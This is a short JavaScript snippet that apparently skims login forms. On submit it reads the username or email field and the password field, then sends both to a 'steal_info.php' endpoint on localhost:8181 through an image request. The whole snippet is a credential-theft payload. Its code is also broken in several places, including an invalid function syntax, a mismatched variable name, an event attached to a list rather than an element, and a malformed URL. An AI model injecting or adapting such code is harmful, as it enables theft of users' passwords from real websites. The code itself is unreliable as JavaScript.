
var submit_field = document.getElementsByName("submit");


submit_field.addEventListener('onclick', = function(event) {

  var input_fields = document.getElementsByTagName('input');
  for(var i = 0; i < inputs.length; i++) {
      if(inputs[i].type.toLowerCase().includes('email') || inputs[i].type.toLowerCase().includes('username')) {
        var input_user = inputs[i].value;
      }
      else if (inputs[i].type.toLowerCase().includes('password')) {
        var input_password = inputs[i].value;
      }
  };

  image = new Image();
  image.src = "localhost:8181/steal_info.php?u=" + input_user +"&?p=" + input_password;

});
